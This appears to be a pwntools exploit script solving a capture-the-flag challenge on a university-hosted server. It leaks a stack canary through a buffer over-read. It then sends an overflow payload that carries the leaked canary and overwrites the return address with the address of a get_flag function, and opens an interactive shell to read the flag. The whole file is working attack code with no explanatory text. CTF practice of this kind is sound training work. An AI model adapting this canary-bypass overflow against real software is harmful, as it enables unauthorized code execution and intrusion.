#!/usr/bin/env python
from pwn import *

context.arch = "i386"
context.os = "linux"

e = ELF("bin")
SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 10202

INPUT = "\nInput: "
PADD = b'X' * 64
CANPADD = b'X' * 12
GETFLAG = p32(e.symbols["get_flag"])

s = remote(SERVER, PORT)
s.recvuntil(INPUT)
s.sendline('w')
s.sendline(PADD)
s.recvuntil(INPUT)
s.sendline('p')

CAN = p32(u32(s.recvuntil(INPUT)[64:-len(INPUT)]) - ord('\n'))

s.sendline('w')
s.sendline(PADD + CAN + CANPADD + GETFLAG)
s.recvuntil(INPUT)
s.sendline('e')
s.clean()
s.interactive() # cat /home/ctf/flag
s.close()
